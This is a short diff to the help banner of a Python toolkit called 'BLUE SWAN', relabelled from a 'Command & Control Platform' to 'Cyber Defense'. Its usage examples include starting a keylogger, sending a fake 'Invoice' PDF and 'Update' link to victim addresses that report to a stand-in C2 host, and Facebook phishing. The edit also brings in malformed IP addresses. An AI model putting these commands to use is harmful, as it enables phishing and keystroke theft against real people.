@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-🦢 BLUE SWAN v1.0.0 - Ultimate Cybersecurity Command & Control Platform
+🦢 BLUE SWAN v1.0.0 - Accurate Cyber Defense 
 Author: Ian Carter Kulani
 Version: 1.0.0
 
@@ -6803,16 +6803,16 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ║  keylogger_start
 ║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
 ║  deploy_link "Update" "user@email.com" "http://c2-server.com/download"
-║  ip_to_domain 8.8.8.8
-║  domain_to_ip google.com
+║  ip_to_domain 127.0.0.0.1
+║  domain_to_ip accuaratecyberdefense.com
 ║  host_domain 192.168.1.100 mydomain.local 8080
 ║  monitor_add 192.168.1.100 Suspicious-IP
 ║  monitor_status 192.168.1.100
 ║  monitor_alerts
 ║  blockchain_info
 ║  phish_facebook
-║  add_ip 192.168.1.100 Suspicious
-║  analyze_ip 8.8.8.8
+║  add_ip 192.168.1.100 Suspicious                                             ║
+║  analyze_ip 127.0.0.                                                         ║
 ║
 ║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
 ╚══════════════════════════════════════════════════════════════════════════════╝
